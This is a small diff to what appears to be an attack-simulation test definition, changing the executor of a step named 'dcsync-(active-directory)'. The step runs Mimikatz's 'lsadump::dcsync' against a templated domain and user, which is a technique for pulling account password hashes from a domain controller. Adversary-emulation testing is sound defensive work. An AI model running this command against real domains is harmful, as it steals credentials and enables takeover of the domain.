@@ -34,4 +34,4 @@ steps:
     - name: dcsync-(active-directory)
       inline: |
         {{.Args.mimikatz_path}} "lsadump::dcsync /domain:{{.Args.domain}} /user:{{.Args.user}}@{{.Args.domain}}" "exit"
-      executor: command_prompt
+      executor: cmd
